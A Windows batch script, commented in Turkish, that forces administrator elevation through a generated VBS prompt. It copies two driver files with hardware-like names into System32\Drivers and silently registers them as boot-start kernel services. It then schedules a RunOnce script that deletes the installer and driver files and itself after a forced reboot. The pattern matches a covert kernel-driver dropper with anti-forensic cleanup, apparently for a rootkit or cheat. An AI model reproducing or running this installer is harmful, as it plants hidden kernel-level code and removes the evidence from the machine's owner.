@echo off
setlocal enabledelayedexpansion

:: Yönetici izni kontrolü
openfiles >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

:: System32\Drivers klasörüne kopyalama
set "system32Dir=C:\Windows\System32\Drivers"

if exist "%~dp0kvmhookx.sys" (
    copy /y "%~dp0kvmhookx.sys" "%system32Dir%"
)

if exist "%~dp0xinputv1a.sys" (
    copy /y "%~dp0xinputv1a.sys" "%system32Dir%"
)

:: Servisleri oluştur
sc create kvmhookx binPath= "C:\Windows\System32\Drivers\kvmhookx.sys" DisplayName= "kvmhookx" start= boot tag= 1 type= kernel group= "System Reserved" >nul 2>&1
sc create xinputv1a binPath= "C:\Windows\System32\Drivers\xinputv1a.sys" DisplayName= "xinputv1a" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1

:: ======================
:: YENİDEN BAŞLATMA SONRASI DOSYALARI SİLECEK SCRIPT
:: ======================

:: Bulunduğu dizini al
set "CURRENT_DIR=%~dp0"
set "CLEANER=%TEMP%\clean_after_reboot.bat"

(
echo @echo off
echo timeout /t 5 /nobreak >nul
echo del /f /q "!CURRENT_DIR!Run.bat"
echo del /f /q "!CURRENT_DIR!kvmhookx.sys"
echo del /f /q "!CURRENT_DIR!xinputv1a.sys"
echo del "%%~f0"
) > "!CLEANER!"

:: Sadece bir kere çalışacak şekilde RunOnce'a ekle
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v CleanDrivers /t REG_SZ /d "!CLEANER!" /f

:: Yeniden başlat
shutdown /r /t 5
exit
